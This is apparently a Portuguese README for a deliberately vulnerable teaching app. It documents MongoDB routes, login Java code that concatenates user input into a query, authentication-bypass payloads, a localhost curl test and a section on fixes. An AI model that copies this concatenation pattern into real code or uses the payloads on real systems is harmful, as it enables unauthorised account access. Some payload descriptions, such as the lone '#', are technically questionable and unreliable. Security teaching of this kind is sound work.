# MongoDB Integration with NoSQL Injection Vulnerability

Este documento descreve as novas rotas MongoDB implementadas e a vulnerabilidade de NoSQL Injection criada para fins didáticos.

## Novas Rotas MongoDB

### 1. Register2 - Cadastro de Usuários MongoDB
**Endpoint:** `POST /api/register2`
**Payload:**
```json
{
    "name": "João Silva",
    "login": "joao.silva",
    "password": "senha123",
    "role": "USER"
}
```

### 2. Login2 - Login Vulnerável a NoSQL Injection
**Endpoint:** `POST /api/login2`
**Payload Normal:**
```json
{
    "login": "joao.silva",
    "password": "senha123"
}
```

### 3. AllUsers2 - Listar Todos os Usuários MongoDB
**Endpoint:** `GET /api/allusers2`

### 4. UserById2 - Buscar Usuário por ID
**Endpoint:** `GET /api/userid2/{id}`

### 5. DeleteUser2 - Deletar Usuário
**Endpoint:** `DELETE /api/deluser2/{id}`

## Vulnerabilidade de NoSQL Injection

### Como Funciona a Vulnerabilidade

O endpoint `/api/login2` é vulnerável a NoSQL Injection porque:

1. **Query Dinâmica:** A query é construída concatenando strings diretamente
2. **Sem Sanitização:** Não há validação ou escape dos parâmetros de entrada
3. **Execução Direta:** A query é executada diretamente no MongoDB

### Exemplos de Payloads Maliciosos

#### 1. Bypass de Autenticação
```json
{
    "login": "admin",
    "password": "admin' || '1' == '1"
}
```

#### 2. Extrair Todos os Usuários
```json
{
    "login": "admin",
    "password": "admin' || '1' == '1' || 'a' == 'a"
}
```

#### 3. Injeção de Operadores MongoDB
```json
{
    "login": "admin",
    "password": "#"
}
```

### Código Vulnerável

```java
@PostMapping("/login2")
public ResponseEntity login2(@RequestBody @Valid AuthenticationMongoDTO data){
    // VULNERÁVEL A NOSQL INJECTION
    String maliciousQuery = "{\"login\": \"" + data.login() + "\", \"password\": \"" + data.password() + "\"}";
    
    Optional<UserMongo> userOptional = userMongoService.findByCustomQuery(maliciousQuery);
    // ...
}
```

### Como Testar

1. **Inicie o MongoDB:**
```bash
docker-compose up mongodb
```

2. **Cadastre um usuário:**
```bash
curl -X POST http://localhost:8080/api/register2 \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Admin User",
    "login": "admin",
    "password": "admin123",
    "role": "ADMIN"
  }'
```

3. **Teste a vulnerabilidade:**
```bash
curl -X POST http://localhost:8080/api/login2 \
  -H "Content-Type: application/json" \
  -d '{
    "login": "admin",
    "password": "admin' || '1' == '1"
  }'
```

### Impacto da Vulnerabilidade

1. **Bypass de Autenticação:** Acesso não autorizado a contas
2. **Vazamento de Dados:** Extração de informações sensíveis
3. **Elevação de Privilégios:** Acesso a contas administrativas
4. **Manipulação de Dados:** Modificação não autorizada de registros

### Como Corrigir

1. **Usar Prepared Statements:**
```java
// Correto
UserMongo user = userMongoRepository.findByLogin(data.login());
if (user != null && passwordEncoder.matches(data.password(), user.getPassword())) {
    // Login válido
}
```

2. **Validação de Entrada:**
```java
// Validar formato dos dados
@Pattern(regexp = "^[a-zA-Z0-9]+$")
private String login;
```

3. **Sanitização:**
```java
// Escapar caracteres especiais
String sanitizedLogin = login.replaceAll("[^a-zA-Z0-9]", "");
```

## Configuração do MongoDB

### Docker Compose
O arquivo `docker-compose.yml` inclui configuração para MongoDB:

```yaml
mongodb:
  image: mongo:latest
  ports:
    - "27017:27017"
  environment:
    - MONGO_INITDB_DATABASE=advocacia_mongo
  volumes:
    - mongodb_data:/data/db
```

### Application Properties
```properties
spring.data.mongodb.host=localhost
spring.data.mongodb.port=27017
spring.data.mongodb.database=advocacia_mongo
```

## ⚠️ AVISO IMPORTANTE

Esta implementação contém vulnerabilidades intencionais para fins educacionais. **NUNCA** use este código em produção ou em ambientes reais. As vulnerabilidades foram criadas especificamente para demonstrar os riscos de segurança em aplicações web. 